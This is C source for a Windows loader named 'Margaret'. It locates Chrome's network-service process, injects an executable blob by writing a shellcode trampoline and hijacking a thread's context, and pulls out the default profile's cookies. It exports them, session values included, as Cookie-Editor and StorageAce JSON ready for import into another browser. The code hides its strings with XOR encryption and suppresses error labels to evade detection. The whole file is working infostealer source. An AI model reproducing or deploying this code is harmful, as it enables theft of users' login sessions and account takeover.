/*
 * loader/loader.c — Margaret standalone injector with thread context hijacking.
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include "margaret.h"   /* blob ABI: MARGARET_ARGS + magics, single source */
#include "lstrings.h"

#define MG_TIMEOUT_MS  60000u
#define MG_OUT_CAP     (8u * 1024u * 1024u)

#ifdef LOADER_VERBOSE
#define DBG(...) printf(__VA_ARGS__)
#else
#define DBG(...) do {} while (0)
#endif

static void die(const char *msg) {
#ifdef LOADER_VERBOSE
    fprintf(stderr, "[loader] ERROR: %s (GLE=%lu)\n", msg, GetLastError());
#else
    fprintf(stderr, "x%lu\n", GetLastError());   /* code only, no labels */
#endif
    exit(2);
}

/* decrypt a generated string into a stack buffer (caller wipes) */
static void lstr_a(char *dst, const unsigned char *src, size_t len) {
    unsigned char key = LSTRING_XOR_KEY;
    for (size_t i = 0; i < len; i++) {
        unsigned char c = src[i];
        dst[i] = (char)(c ^ key);
        key = (unsigned char)(key + c + (unsigned char)i);
    }
}
static void lstr_w(wchar_t *dst, const unsigned char *src, size_t bytes) {
    unsigned char key = LSTRING_XOR_KEY;
    for (size_t i = 0; i < bytes; i++) {
        unsigned char c = src[i];
        ((unsigned char *)dst)[i] = (unsigned char)(c ^ key);
        key = (unsigned char)(key + c + (unsigned char)i);
    }
}

static uint32_t rd_u32(const uint8_t *p) {
    return p[0] | (p[1] << 8) | ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

static uint64_t rd_u64(const uint8_t *p) {
    return (uint64_t)rd_u32(p) | ((uint64_t)rd_u32(p + 4) << 32);
}

static void print_str(const uint8_t *s, uint32_t len) {
    for (uint32_t i = 0; i < len; i++)
        putchar((s[i] >= 0x20 && s[i] < 0x7f) ? s[i] : '.');
}

static void jputstr(FILE *f, const uint8_t *s, uint32_t len) {
    fputc('"', f);
    for (uint32_t i = 0; i < len; i++) {
        if (s[i] == '"' || s[i] == '\\') fputc('\\', f);
        fputc(s[i], f);
    }
    fputc('"', f);
}

static int rp_read(HANDLE p, uint64_t addr, void *buf, SIZE_T n) {
    SIZE_T got;
    return ReadProcessMemory(p, (LPCVOID)(uintptr_t)addr, buf, n, &got) && got == n;
}

static uint64_t rp_qword(HANDLE p, uint64_t addr) {
    uint64_t v = 0; rp_read(p, addr, &v, 8); return v;
}

/* --- Chrome network utility finder ----------------------------------- */

static int cmdline_matches(HANDLE p, const wchar_t *needle) {
    typedef LONG (WINAPI *NtQIP)(HANDLE, int, PVOID, ULONG, PULONG);
    static NtQIP ntqip;
    if (!ntqip) {
        char mod[16], fn[64];
        lstr_a(mod, lstring_ntdll, LSTRING_NTDLL_LEN);
        lstr_a(fn, lstring_ntqip, LSTRING_NTQIP_LEN);
        HMODULE nt = GetModuleHandleA(mod);
        if (nt) ntqip = (NtQIP)GetProcAddress(nt, fn);
        SecureZeroMemory(mod, sizeof(mod));
        SecureZeroMemory(fn, sizeof(fn));
        if (!ntqip) return 0;
    }

    unsigned char pbi[48];
    if (ntqip(p, 0, pbi, sizeof(pbi), NULL) != 0) return 0;
    uint64_t peb = *(uint64_t *)(pbi + 8);
    if (!peb) return 0;
    uint64_t params = rp_qword(p, peb + 0x20);
    if (!params) return 0;

    /* UNICODE_STRING: Length(2) MaxLen(2) pad(4) Buffer(8) */
    uint64_t cl_raw = rp_qword(p, params + 0x70);
    uint64_t cl_len = cl_raw & 0xFFFF; /* Length, not MaxLength */
    uint64_t cl_buf = rp_qword(p, params + 0x78);
    if (!cl_buf || cl_len == 0 || cl_len > 8190) return 0;

    wchar_t cl[4096];
    memset(cl, 0, sizeof(cl));
    if (!rp_read(p, cl_buf, cl, (SIZE_T)cl_len)) return 0;
    cl[cl_len / 2] = 0;
    return wcsstr(cl, needle) != NULL;
}

static DWORD find_network_service_pid_inner(const wchar_t *NEEDLE,
                                            const wchar_t *EXE);

static DWORD find_network_service_pid(void) {
    wchar_t NEEDLE[48], EXE[12];
    lstr_w(NEEDLE, lstring_needle_network, LSTRING_NEEDLE_NETWORK_LEN);
    lstr_w(EXE, lstring_chrome_exe, LSTRING_CHROME_EXE_LEN);
    DWORD found = find_network_service_pid_inner(NEEDLE, EXE);
    SecureZeroMemory(NEEDLE, sizeof(NEEDLE));
    SecureZeroMemory(EXE, sizeof(EXE));
    return found;
}

static DWORD find_network_service_pid_inner(const wchar_t *NEEDLE,
                                            const wchar_t *EXE) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);
    DWORD found = 0;

    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, EXE) != 0) continue;
            HANDLE p = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                    FALSE, pe.th32ProcessID);
            if (!p) continue;
            if (cmdline_matches(p, NEEDLE)) {
                found = pe.th32ProcessID;
                CloseHandle(p);
                break;
            }
            CloseHandle(p);
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

/* --- thread context hijacking ---------------------------------------- */

typedef struct {
    DWORD dwSize, cntUsage, th32ThreadID, th32OwnerProcessID;
    LONG tpBasePri, tpDeltaPri;
    DWORD dwFlags;
} MY_TE32;

typedef LONG (WINAPI *NtQIT_t)(HANDLE, int, PVOID, ULONG, PULONG);

/* Remaining stack = current RSP - StackLimit.  The blob + Chrome's
 * de-obfuscator need several KB; hijacking a nearly-exhausted thread
 * crashes with 0xC0000005. */
static uint64_t thread_stack_remaining(HANDLE proc, HANDLE thread, NtQIT_t ntqit) {
    unsigned char tbi[48];
    CONTEXT ctx;
    uint64_t teb, slim, rsp;

    memset(tbi, 0, sizeof(tbi));
    if (ntqit(thread, 0, tbi, sizeof(tbi), NULL) != 0) return 0;
    teb = *(uint64_t *)(tbi + 8);
    if (!teb) return 0;
    slim = rp_qword(proc, teb + 0x10);  /* StackLimit */
    if (!slim) return 0;

    /* need the thread's current RSP: suspend briefly */
    if (SuspendThread(thread) == (DWORD)-1) return 0;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_CONTROL;
    int ok = GetThreadContext(thread, &ctx);
    ResumeThread(thread);
    if (!ok) return 0;
    rsp = ctx.Rsp;

    return (rsp > slim) ? (rsp - slim) : 0;
}

/* Pick the thread with the most REMAINING stack headroom. */
static DWORD find_hijack_thread(HANDLE proc, DWORD target_pid) {
    char mod[16], fn[64];
    HMODULE nt;
    NtQIT_t ntqit;
    lstr_a(mod, lstring_ntdll, LSTRING_NTDLL_LEN);
    lstr_a(fn, lstring_ntqit, LSTRING_NTQIT_LEN);
    nt = GetModuleHandleA(mod);
    if (nt) ntqit = (NtQIT_t)GetProcAddress(nt, fn);
    else ntqit = NULL;
    SecureZeroMemory(mod, sizeof(mod));
    SecureZeroMemory(fn, sizeof(fn));
    if (!ntqit) return 0;

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    MY_TE32 te;
    memset(&te, 0, sizeof(te));
    te.dwSize = sizeof(te);
    DWORD best_tid = 0;
    uint64_t best_remaining = 0;

    if (Thread32First(snap, (THREADENTRY32 *)&te)) {
        do {
            if (te.th32OwnerProcessID != target_pid) continue;
            HANDLE t = OpenThread(
                THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
                THREAD_QUERY_INFORMATION,
                FALSE, te.th32ThreadID);
            if (!t) continue;
            uint64_t rem = thread_stack_remaining(proc, t, ntqit);
            CloseHandle(t);
            if (rem > best_remaining) {
                best_remaining = rem;
                best_tid = te.th32ThreadID;
            }
        } while (Thread32Next(snap, (THREADENTRY32 *)&te));
    }
    CloseHandle(snap);
    if (best_tid)
        DBG("[loader] thread %lu (remaining stack %llu KB)\n",
               best_tid, (unsigned long long)(best_remaining / 1024));
    return best_tid;
}

static uint8_t *g_r_tramp = NULL; /* diagnostics: post-mortem dump */

static HANDLE hijack_thread(HANDLE proc, DWORD tid,
                             uint8_t *r_blob, uint8_t *r_args,
                             uint8_t **out_tramp) {
    HANDLE victim = OpenThread(
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
        THREAD_QUERY_INFORMATION,
        FALSE, tid);
    if (!victim) return NULL;
    *out_tramp = NULL;

    if (SuspendThread(victim) == (DWORD)-1) {
        CloseHandle(victim);
        return NULL;
    }

    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(victim, &ctx)) {
        ResumeThread(victim);
        CloseHandle(victim);
        return NULL;
    }

    /* One allocation: RX trampoline code at +0, fresh 64KB stack with
     * RSP starting at +0xFFF0 (16-aligned).  The EMIT sequence below IS
     * the spec — markers report progress, volatiles are restored, and
     * the thread resumes at its exact original RIP/RSP. */
    {
        SIZE_T tramp_sz = 0x200 + 0x10000;
        uint8_t *tramp = VirtualAllocEx(proc, NULL, tramp_sz,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!tramp) { ResumeThread(victim); CloseHandle(victim); return NULL; }

        uint8_t code[256];
        size_t n = 0;
        #define EMIT(...) do { memcpy(code + n, (uint8_t[]){__VA_ARGS__}, sizeof((uint8_t[]){__VA_ARGS__})); n += sizeof((uint8_t[]){__VA_ARGS__}); } while (0)
        #define EMIT64(x) do { uint64_t v = (uint64_t)(x); memcpy(code + n, &v, 8); n += 8; } while (0)
        /* marker: write N to args.flags ([r_args+0x28]) via R11 (volatile
         * scratch — must NOT use RAX, it holds the blob address at MARK(2)) */
        #define MARK(N) do { \
            EMIT(0x49, 0xBB); EMIT64((uintptr_t)(r_args + 0x28)); /* mov r11, &args->flags */ \
            EMIT(0x41, 0xC7, 0x03, (N) & 0xFF, ((N) >> 8) & 0xFF, ((N) >> 16) & 0xFF, ((N) >> 24) & 0xFF); /* mov dword [r11], N */ \
        } while (0)

        MARK(1);                                         /* trampoline entered */
        /* RCX = args: MUST load here — if the thread resumed from a syscall,
         * sysret clobbers RCX (loads it with the target RIP), so the RCX
         * set via SetThreadContext never reaches the blob. */
        EMIT(0x48, 0xB9); EMIT64((uintptr_t)r_args);    /* mov rcx, args */
        EMIT(0x48, 0x83, 0xEC, 0x20);                   /* sub rsp, 0x20 */
        EMIT(0x48, 0xB8); EMIT64((uintptr_t)r_blob);    /* mov rax, blob */
        MARK(2);                                         /* about to call blob */
        EMIT(0xFF, 0xD0);                               /* call rax */
        MARK(3);                                         /* blob returned */
        EMIT(0x48, 0x83, 0xC4, 0x20);                   /* add rsp, 0x20 */
        EMIT(0x48, 0xB8); EMIT64(ctx.Rax);              /* mov rax, orig_rax */
        EMIT(0x48, 0xB9); EMIT64(ctx.Rcx);              /* mov rcx, orig_rcx */
        EMIT(0x48, 0xBA); EMIT64(ctx.Rdx);              /* mov rdx, orig_rdx */
        EMIT(0x49, 0xB8); EMIT64(ctx.R8);               /* mov r8, orig_r8 */
        EMIT(0x49, 0xB9); EMIT64(ctx.R9);               /* mov r9, orig_r9 */
        EMIT(0x49, 0xBA); EMIT64(ctx.R10);              /* mov r10, orig_r10 */
        EMIT(0x49, 0xBB); EMIT64(ctx.R11);              /* mov r11, orig_r11 */
        EMIT(0x48, 0xBC); EMIT64(ctx.Rsp);              /* mov rsp, orig_rsp */
        MARK(4);                                         /* registers restored */
        EMIT(0x48, 0xB8); EMIT64(ctx.Rip);              /* mov rax, orig_rip */
        EMIT(0xFF, 0xE0);                               /* jmp rax */
        #undef MARK
        #undef EMIT
        #undef EMIT64

        SIZE_T w;
        if (!WriteProcessMemory(proc, tramp, code, n, &w) || w != n) {
            VirtualFreeEx(proc, tramp, 0, MEM_RELEASE);
            ResumeThread(victim); CloseHandle(victim);
            return NULL;
        }
        {
            DWORD old;
            if (!VirtualProtectEx(proc, tramp, 0x200, PAGE_EXECUTE_READ, &old)) {
                VirtualFreeEx(proc, tramp, 0, MEM_RELEASE);
                ResumeThread(victim); CloseHandle(victim);
                return NULL;
            }
        }

        /* Redirect: RIP = trampoline, RSP = fresh stack top (16-aligned),
         * RCX = args (Margaret ABI) */
        ctx.Rip = (uint64_t)(uintptr_t)tramp;
        ctx.Rsp = (uint64_t)(uintptr_t)(tramp + 0xFFF0);
        ctx.Rcx = (uint64_t)(uintptr_t)r_args;

        /* verify the trampoline bytes landed */
        {
            uint8_t rb[16];
            SIZE_T got;
            if (!ReadProcessMemory(proc, tramp, rb, 16, &got) || got != 16) {
                DBG("[loader] trampoline readback FAILED\n");
                VirtualFreeEx(proc, tramp, 0, MEM_RELEASE);
                ResumeThread(victim); CloseHandle(victim);
                return NULL;
            }
            DBG("[loader] tramp=%p blob=%p args=%p rsp=%llx code=%02x %02x %02x %02x\n",
                   (void *)tramp, (void *)r_blob, (void *)r_args,
                   (unsigned long long)ctx.Rsp, rb[0], rb[1], rb[2], rb[3]);
        }

        if (!SetThreadContext(victim, &ctx)) {
            VirtualFreeEx(proc, tramp, 0, MEM_RELEASE);
            ResumeThread(victim);
            CloseHandle(victim);
            return NULL;
        }
        *out_tramp = tramp;   /* caller frees after the thread leaves it */
        g_r_tramp = tramp;
    }

    ResumeThread(victim);
    return victim;
}

#define MG_STATUS_SENTINEL 0xDEADBEEFu

/* Returns 1=completed, -1=thread died, 0=timeout.
 * Polls args.status (blob writes it on completion) — RIP-based detection
 * gives false positives when the blob calls Chrome/kernel32 code. */

static int wait_hijack(HANDLE victim, HANDLE proc, uint8_t *r_args,
                        uint32_t timeout_ms) {
    uint32_t elapsed = 0;
    uint64_t last_rip = 0;
    (void)last_rip;   /* only read by verbose diagnostics */
    int first_poll = 1;
    while (elapsed < timeout_ms) {
        DWORD ec;
        uint32_t status = 0;
        CONTEXT c;

        /* completion first: the sentinel proves done even if the
         * thread dies a moment later */
        if (rp_read(proc, (uint64_t)(uintptr_t)(r_args + 0x20),
                    &status, 4) && status != MG_STATUS_SENTINEL) {
            return 1;
        }

        /* track RIP */
        memset(&c, 0, sizeof(c));
        c.ContextFlags = CONTEXT_FULL;
        if (GetThreadContext(victim, &c)) {
            if (first_poll) {
                first_poll = 0;
                DBG("[loader] first poll: RIP=%llx RSP=%llx RCX=%llx\n",
                       (unsigned long long)c.Rip,
                       (unsigned long long)c.Rsp,
                       (unsigned long long)c.Rcx);
            }
            last_rip = c.Rip;
        }

        /* death only after the completion check */
        if (GetExitCodeThread(victim, &ec) && ec != STILL_ACTIVE) {
            uint32_t marker = 0;
            uint8_t tb[32] = {0};
            rp_read(proc, (uint64_t)(uintptr_t)(r_args + 0x28), &marker, 4);
            DBG("[loader] thread DIED (exit=0x%lX, marker=%u, last RIP=%llx)\n",
                   (unsigned long)ec, marker,
                   (unsigned long long)last_rip);
            if (g_r_tramp &&
                rp_read(proc, (uint64_t)(uintptr_t)g_r_tramp, tb, 32)) {
                DBG("[loader] tramp post-mortem: ");
                for (int i = 0; i < 32; i++) printf("%02x ", tb[i]);
                printf("\n");
            }
            return -1;
        }
        Sleep(20);
        elapsed += 20;
    }
    return 0;
}

/* RFC 6265bis name-prefix rules are invariants enforced by Chrome itself:
 * a cookie can only exist in the jar with these attributes, so reconstruct
 * them from the name — __Secure- needs Secure; __Host- needs Secure +
 * hostOnly + path=/.  Without this, Chrome silently REJECTS the imported
 * cookie.  The MCEA flags dword additionally carries engine-calibrated
 * secure_/httponly_ bits when calibration converged (0 otherwise). */
static int name_forces_secure(const uint8_t *nm, uint32_t nl) {
    return (nl >= 8 && !memcmp(nm, "__Secure-", 8)) ||
           (nl >= 7 && !memcmp(nm, "__Host-", 7));
}
static int name_forces_hostonly(const uint8_t *nm, uint32_t nl) {
    return (nl >= 7 && !memcmp(nm, "__Host-", 7));
}


/* --- main -------------------------------------------------------------- */

int main(int argc, char **argv) {
    DWORD pid;
    const char *blob_path;
    uint8_t *blob;
    long blob_size;
    HANDLE proc, victim = NULL;
    uint8_t *r_blob, *r_args, *r_out;
    MARGARET_ARGS args, back;
    SIZE_T written = 0;

    int test_mode = (argc >= 2 && strcmp(argv[1], "--test") == 0);

    if (test_mode) {
        /* 27-byte diagnostic stub: exercises the trampoline mechanics
         * (markers, call, resume) without any blob logic. */
        static const uint8_t test_stub[] = {
            0x48, 0x8B, 0x41, 0x10,                    /* mov rax,[rcx+0x10] */
            0xC7, 0x00, 0xEF, 0xBE, 0xAD, 0xDE,        /* mov dword[rax],0xDEADBEEF */
            0xC7, 0x41, 0x1C, 0x04, 0x00, 0x00, 0x00,  /* mov dword[rcx+0x1C],4 */
            0xC7, 0x41, 0x20, 0x78, 0x56, 0x34, 0x12,  /* mov dword[rcx+0x20],0x12345678 */
            0x31, 0xC0,                                 /* xor eax,eax */
            0xC3                                        /* ret */
        };
        blob = malloc(sizeof(test_stub));
        memcpy(blob, test_stub, sizeof(test_stub));
        blob_size = (long)sizeof(test_stub);
        DBG("[loader] TEST MODE: %zu-byte stub\n", sizeof(test_stub));
    } else if (argc < 2) {
        DBG("usage: %s <pid> <blob> | %s <blob> (auto) | %s --test [pid]\n",
            argv[0], argv[0], argv[0]);
        return 1;
    }
    if (test_mode) {
        pid = (argc >= 3) ? (DWORD)strtoul(argv[2], NULL, 0) : 0;
        blob_path = NULL;
    } else if (argc >= 3) {
        pid = (DWORD)strtoul(argv[1], NULL, 0);
        blob_path = argv[2];
    } else {
        blob_path = argv[1];
        pid = 0;
    }
    if (!pid) {
        pid = find_network_service_pid();
        if (!pid) { DBG("[loader] network utility not found\n"); return 1; }
    }
    DBG("[loader] pid=%lu\n", pid);

    if (!test_mode) {
    FILE *bf = fopen(blob_path, "rb");
    if (!bf) die("open blob");
    fseek(bf, 0, SEEK_END);
    blob_size = ftell(bf);
    fseek(bf, 0, SEEK_SET);
    blob = malloc(blob_size);
    if (!blob || fread(blob, 1, blob_size, bf) != (size_t)blob_size) die("read blob");
    fclose(bf);
    DBG("[loader] blob=%ld bytes\n", blob_size);
    }

    proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!proc) die("OpenProcess");

    r_blob = VirtualAllocEx(proc, NULL, blob_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    r_args = VirtualAllocEx(proc, NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    r_out  = VirtualAllocEx(proc, NULL, MG_OUT_CAP, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!r_blob || !r_args || !r_out) die("VirtualAllocEx");

    if (!WriteProcessMemory(proc, r_blob, blob, blob_size, &written) ||
        written != (SIZE_T)blob_size) die("write blob");
    {
        DWORD old;
        if (!VirtualProtectEx(proc, r_blob, blob_size, PAGE_EXECUTE_READ, &old))
            die("VirtualProtectEx");
    }

    memset(&args, 0, sizeof(args));
    args.size = sizeof(args);
    args.version = MARGARET_ABI_VERSION;
    args.magic = MARGARET_ARGUMENT_MAGIC;
    args.operation = MARGARET_OP_SNAPSHOT_DEFAULT_PROFILE;
    args.output_buffer = r_out;
    args.output_capacity = MG_OUT_CAP;
    args.timeout_ms = MG_TIMEOUT_MS;
    args.status = MG_STATUS_SENTINEL;  /* blob clears this on completion */
    if (!WriteProcessMemory(proc, r_args, &args, sizeof(args), &written) ||
        written != sizeof(args)) die("write args");

    /* --- inject via thread hijack --- */
    {
        DWORD tid = find_hijack_thread(proc, pid);
        if (!tid) die("no thread found");
        uint8_t *r_tramp = NULL;
        DBG("[loader] hijacking thread %lu\n", tid);
        victim = hijack_thread(proc, tid, r_blob, r_args, &r_tramp);
        if (!victim) die("hijack failed");

        DBG("[loader] waiting...\n");
        int rc = wait_hijack(victim, proc, r_args, 120000);
        if (rc == -1) {
            DBG("[loader] blob crashed the thread\n");
            if (r_tramp) VirtualFreeEx(proc, r_tramp, 0, MEM_RELEASE);
            goto cleanup;
        }
        if (rc == 0) {
            DBG("[loader] timeout\n");
            goto cleanup;
        }
        DBG("[loader] done\n");
        /* the trampoline is dead code once the thread has left it: wait
         * for RIP to exit the code region (bounded), then free it.  On
         * timeout we intentionally leak: the thread may still run there. */
        if (r_tramp) {
            uint32_t waited = 0;
            while (waited < 5000) {
                CONTEXT tc;
                memset(&tc, 0, sizeof(tc));
                tc.ContextFlags = CONTEXT_CONTROL;
                if (!GetThreadContext(victim, &tc)) break;
                if (tc.Rip < (uint64_t)(uintptr_t)r_tramp ||
                    tc.Rip >= (uint64_t)(uintptr_t)(r_tramp + 0x200)) {
                    VirtualFreeEx(proc, r_tramp, 0, MEM_RELEASE);
                    r_tramp = NULL;
                    break;
                }
                Sleep(25); waited += 25;
            }
            if (r_tramp)
                DBG("[loader] note: trampoline not freed (thread still inside)\n");
        }
    }

    /* read results */
    if (!rp_read(proc, (uint64_t)(uintptr_t)r_args, &back, sizeof(back)))
        die("read args");
    DBG("[loader] status=0x%X output_length=%u flags=0x%X pad=0x%X\n",
        back.status, back.output_length, back.flags, back.pad);
    if (back.status != 0) {
        uint8_t hdr[32];
        if (back.output_length >= 32 &&
            rp_read(proc, (uint64_t)(uintptr_t)r_out, hdr, 32)) {
            uint64_t se = 0, lh = 0;
            for (int i = 7; i >= 0; i--) se = (se << 8) | hdr[12 + i];
            for (int i = 7; i >= 0; i--) lh = (lh << 8) | hdr[20 + i];
            DBG("[loader] MCEA scan_end=0x%llX last_hit=0x%llX\n",
                (unsigned long long)se, (unsigned long long)lh);
        }
        if (back.output_length > 32) {
            uint32_t dl = back.output_length - 32u;
            uint8_t *db;
            if (dl > 0x240u) dl = 0x240u;
            db = malloc(dl);
            if (db && rp_read(proc, (uint64_t)(uintptr_t)r_out + 32u,
                              db, dl)) {
                for (uint32_t i = 0; i < dl; i += 16) {
                    printf("%03X: ", i);
                    for (uint32_t j = 0; j < 16 && i + j < dl; j++)
                        printf("%02X ", db[i + j]);
                    printf("\n");
                }
            }
            free(db);
        }
        goto cleanup;
    }
    if (back.output_length == 0) goto cleanup;

    uint8_t *out = malloc(back.output_length);
    if (!out || !rp_read(proc, (uint64_t)(uintptr_t)r_out, out, back.output_length))
        die("read output");

    uint32_t ncookies = rd_u32(out + 4);
    DBG("[loader] MCEA cookies=%u\n", ncookies);

    /* print + Cookie-Editor + StorageAce exports */
    {
        const uint8_t *p = out + 32;
        const uint8_t *end = out + back.output_length;
        char feditor[32], fstorage[32];
        lstr_a(feditor, lstring_json_editor, LSTRING_JSON_EDITOR_LEN);
        lstr_a(fstorage, lstring_json_storage, LSTRING_JSON_STORAGE_LEN);
        FILE *jf = fopen(feditor, "w");
        FILE *sf = fopen(fstorage, "w");
        uint32_t wc = 0;

        if (jf) fprintf(jf, "[");
        if (sf) fprintf(sf, "[");

        for (uint32_t i = 0; i < ncookies && p + 4 <= end; i++) {
            uint32_t nl=rd_u32(p); p+=4; const uint8_t *nm=p; p+=nl;
            if (p+4>end) break;
            uint32_t dl=rd_u32(p); p+=4; const uint8_t *dm=p; p+=dl;
            if (p+4>end) break;
            uint32_t pl=rd_u32(p); p+=4; const uint8_t *pt=p; p+=pl;
            if (p+4>end) break;
            uint32_t vl=rd_u32(p); p+=4; const uint8_t *vv=p; p+=vl;
            if (p+28>end) break;
            p+=8;
            uint64_t ex=rd_u64(p); p+=8;
            uint32_t fl=rd_u32(p); p+=4;
            uint32_t ss=rd_u32(p); p+=4;
            p+=4;

            double ux = (double)ex/1e6 - 11644473600.0;
            if (ux<=0) ux = 32503680000.0;
            const char *ssv = (ss==1)?"lax":(ss==2)?"strict":"no_restriction";

            printf("[%u] ", i);
            print_str(nm,nl); printf(" | ");
            print_str(dm,dl); printf(" | value=");
            print_str(vv,vl); printf("\n");

            if (jf) {
                int fsec = (fl & 1) || name_forces_secure(nm, nl);
                int fhost = name_forces_hostonly(nm, nl);
                fprintf(jf, "%s\n  {\"url\": \"https://%.*s/\", \"name\": ",
                       wc?",":"", (int)dl, dm);
                jputstr(jf,nm,nl);
                fprintf(jf, ", \"value\": ");
                jputstr(jf,vv,vl);
                fprintf(jf, ", \"domain\": ");
                jputstr(jf,dm,dl);
                fprintf(jf, ", \"path\": ");
                jputstr(jf,pt,pl);
                fprintf(jf, ", \"secure\": %s, \"httpOnly\": %s, \"sameSite\": \"%s\", \"hostOnly\": %s, \"expirationDate\": %.0f}",
                       fsec?"true":"false",
                       (fl&2)?"true":"false", ssv,
                       fhost?"true":"false", ux);
            }
            if (sf) {
                int fsec = (fl & 1) || name_forces_secure(nm, nl);
                fprintf(sf, "%s\n  {\"path\": ", wc?",":"");
                jputstr(sf,pt,pl);
                fprintf(sf, ", \"domain\": ");
                jputstr(sf,dm,dl);
                fprintf(sf, ", \"expirationDate\": %.0f, \"value\": ", ux);
                jputstr(sf,vv,vl);
                fprintf(sf, ", \"name\": ");
                jputstr(sf,nm,nl);
                fprintf(sf, ", \"httpOnly\": %s, \"hostOnly\": %s, \"secure\": %s, \"session\": false}",
                       (fl&2)?"true":"false",
                       name_forces_hostonly(nm, nl)?"true":"false",
                       fsec?"true":"false");
            }
            wc++;
        }
        if (jf) { fprintf(jf, "\n]\n"); fclose(jf); }
        if (sf) { fprintf(sf, "\n]\n"); fclose(sf); }
        DBG("[loader] %u cookies exported\n", wc);

        SecureZeroMemory(feditor, sizeof(feditor));
        SecureZeroMemory(fstorage, sizeof(fstorage));
    }

    free(out);

cleanup:
    if (victim) CloseHandle(victim);
    if (r_blob) VirtualFreeEx(proc, r_blob, 0, MEM_RELEASE);
    if (r_args) VirtualFreeEx(proc, r_args, 0, MEM_RELEASE);
    if (r_out) VirtualFreeEx(proc, r_out, 0, MEM_RELEASE);
    if (proc) CloseHandle(proc);
    free(blob);
    return 0;
}
